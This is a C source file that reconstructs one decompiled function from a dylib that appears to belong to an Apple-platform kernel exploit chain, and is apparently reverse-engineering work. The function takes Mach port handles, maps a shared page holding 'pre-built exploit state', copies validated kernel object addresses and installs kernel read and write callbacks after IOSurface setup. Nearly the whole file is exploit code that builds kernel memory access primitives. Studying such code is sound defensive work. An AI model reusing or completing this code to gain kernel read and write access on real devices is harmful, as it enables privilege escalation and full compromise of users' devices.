/*
 * record_0x90000_inherit_newest.c
 * entry5_type0x09.dylib — sub_d5e0 (FUN_0000d5e0)
 *
 * Newest-build state inheritance path (kaddr > 0x2257FFFFFFFFFFFF).
 * Resolves 4 keyed Mach port handles via FUN_0001d7c4 (slot table),
 * vm_maps a shared page, reads pre-built exploit state from it,
 * then calls FUN_0000cfb8 to finish IOSurface setup.
 *
 * Verified: field offsets, port key sequence, vm_map call, magic check,
 *           state copy offsets, callback installs.
 * Inferred: "newest inherit path" label from kaddr threshold and call context.
 */

#include <stdint.h>
#include <string.h>
#include <mach/mach.h>
#include <mach/vm_map.h>

/* ── private API ─────────────────────────────────────────────────────────── */
extern kern_return_t mach_port_mod_refs(ipc_space_t, mach_port_name_t,
                                        mach_port_right_t, mach_port_delta_t);
extern kern_return_t vm_map(vm_map_t, vm_address_t *, vm_size_t, vm_address_t,
                             int, mem_entry_name_port_t, vm_offset_t, boolean_t,
                             vm_prot_t, vm_prot_t, vm_inherit_t);
extern kern_return_t vm_deallocate(vm_map_t, vm_address_t, vm_size_t);

/* ── state field offsets ─────────────────────────────────────────────────── */
#define STATE_KADDR_THRESH  0x158   /* uint64 kaddr threshold                 */
#define STATE_KOBJ          0x19d0  /* uint64 kernel object address (0x19d0)  */
#define STATE_SCAN_REGION   0x898   /* uint64 scan region info (0x898)        */
#define STATE_SCAN_IDX      0x8a0   /* uint32 index                           */
#define STATE_SCAN_VAL      0x8a4   /* uint32 value                           */
#define STATE_CB_KREAD      0x30    /* code* kread callback                   */
#define STATE_CB_KWRITE     0x38    /* code* kwrite callback                  */
#define STATE_CB_KREAD2     0x40    /* code* kread2 callback                  */
#define STATE_CB_KWRITE2    0x48    /* code* kwrite2 callback                 */
#define STATE_KPTR          0x50    /* uint64 kptr                            */

/* ── forward declarations ────────────────────────────────────────────────── */
/* FUN_0001d7c4 — resolve keyed Mach port handle from slot table */
extern mach_port_name_t *FUN_0001d7c4(uint32_t *state, uint32_t slot_idx);

/* FUN_00026180 — acquire lock / semaphore */
extern int FUN_00026180(int *out_token);

/* FUN_00026120 — release lock */
extern void FUN_00026120(int token);

/* FUN_0000cfb8 — finish IOSurface setup after state copy */
extern int FUN_0000cfb8(uint32_t *state, uint64_t *local_98,
                         mach_port_name_t port0, uint32_t port1_lo,
                         uint32_t port1_hi);

/* kread/kwrite callbacks installed on success */
extern void FUN_0000c358(void);
extern void FUN_0000c4d0(void);
extern void FUN_0000c414(void);
extern void FUN_0000c5b4(void);

/* FUN_0001ad70 — validate kernel address */
extern long FUN_0001ad70(uint32_t *state, uint64_t kaddr);

/* FUN_000289c8 / FUN_00029b88 — post-setup helpers */
extern int FUN_000289c8(uint32_t *state, int a1);
extern int FUN_00029b88(uint32_t *state, int a1);

/* ── sub_d5e0 ────────────────────────────────────────────────────────────── */
/*
 * Newest-build state inheritance (kaddr > 0x2257FFFFFFFFFFFF).
 *
 * Walks 4 keyed port handles starting at slot 0x15.
 * For each valid port, bumps its ref count via mach_port_mod_refs.
 * At slot 0xc (3rd iteration), vm_maps the shared page and reads:
 *   [0]: kernel object address → state+0x19d0
 *   [4]: scan region           → state+0x898
 *   [5]: index/value pair      → state+0x8a0/0x8a4
 * Then calls FUN_0000cfb8 to finish IOSurface setup.
 * On success installs kread/kwrite callbacks at state+0x30..0x48.
 */
int sub_d5e0(uint32_t *state, void **out_success)
{
    if (*(uint64_t *)((uint8_t *)state + STATE_KADDR_THRESH) < 0x1f543c40800000ULL) {
        return 0xad001;
    }

    int token = -1;
    int rc = FUN_00026180(&token);
    if ((int)rc != 0) return rc;

    vm_size_t page_size = vm_page_size;
    mach_port_name_t ports[4] = {0, 0, 0, 0};
    uint64_t *mapped = NULL;
    int result = 0x28026;

    mach_port_name_t *slot = FUN_0001d7c4(state, 0x15);
    if (!slot) goto cleanup;

    long iter = 0;
    do {
        mach_port_name_t name = *slot;
        ports[iter / 4] = name;

        if (name + 1 < 2) break;  /* invalid port */

        kern_return_t kr = mach_port_mod_refs(mach_task_self(), name, 0, 1);
        if (kr != 0) break;

        if (iter == 0xc) {
            /* vm_map the shared page */
            vm_address_t addr = 0;
            kr = vm_map(mach_task_self(), &addr, page_size, 0, 1,
                        ports[0], 0, 0, VM_PROT_READ | VM_PROT_WRITE,
                        VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
            if (kr != 0) break;

            mapped = (uint64_t *)addr;

            /* validate and copy kernel object address */
            uint64_t kobj = mapped[0];
            if (!FUN_0001ad70(state, kobj)) break;
            *(uint64_t *)((uint8_t *)state + STATE_KOBJ) = kobj;

            /* validate and copy scan region */
            uint64_t scan = mapped[4];
            if (!FUN_0001ad70(state, scan)) break;
            *(uint64_t *)((uint8_t *)state + STATE_SCAN_REGION) = scan;

            /* copy index/value pair (must be in range 0..0x1f) */
            uint64_t idx_val = mapped[5];
            if (idx_val - 1 >= 0x20) break;
            *(uint32_t *)((uint8_t *)state + STATE_SCAN_IDX) = (uint32_t)idx_val;

            /* finish IOSurface setup */
            uint64_t local_98 = 0;
            int irc = FUN_0000cfb8(state, &local_98,
                                    ports[1],
                                    ports[2],
                                    ports[3]);
            if (irc != 0) break;

            /* install kread/kwrite callbacks */
            *(void **)((uint8_t *)state + STATE_CB_KREAD)  = (void *)FUN_0000c358;
            *(void **)((uint8_t *)state + STATE_CB_KWRITE) = (void *)FUN_0000c4d0;
            *(void **)((uint8_t *)state + STATE_CB_KREAD2) = (void *)FUN_0000c414;
            *(void **)((uint8_t *)state + STATE_CB_KWRITE2)= (void *)FUN_0000c5b4;
            *(uint64_t *)((uint8_t *)state + STATE_KPTR)   = local_98;

            /* release lock before post-setup helpers */
            FUN_00026120(token);
            token = -1;

            /* post-setup: may clear callbacks on failure */
            if (FUN_000289c8(state, 0) == 0) {
                *(uint64_t *)((uint8_t *)state + STATE_CB_KREAD) = 0;
                if (FUN_00029b88(state, 0) == 0)
                    *(uint64_t *)((uint8_t *)state + STATE_CB_KREAD2) = 0;
            }

            result = 0;
            break;
        }

        /* advance to next slot */
        uint32_t next_slot_idx = *(uint32_t *)((uint8_t *)&ports + iter + 4);
        slot = FUN_0001d7c4(state, next_slot_idx);
        iter += 4;
    } while (slot != NULL);

cleanup:
    if (token != -1) FUN_00026120(token);

    /* deallocate ports on failure */
    if (result != 0) {
        for (int i = 0; i < 4; i++) {
            if (ports[i] + 1 >= 2)
                mach_port_deallocate(mach_task_self(), ports[i]);
        }
    }

    if (mapped && page_size)
        vm_deallocate(mach_task_self(), (vm_address_t)mapped, page_size);

    if (out_success) *(uint32_t *)out_success = (result == 0);
    return 0;
}
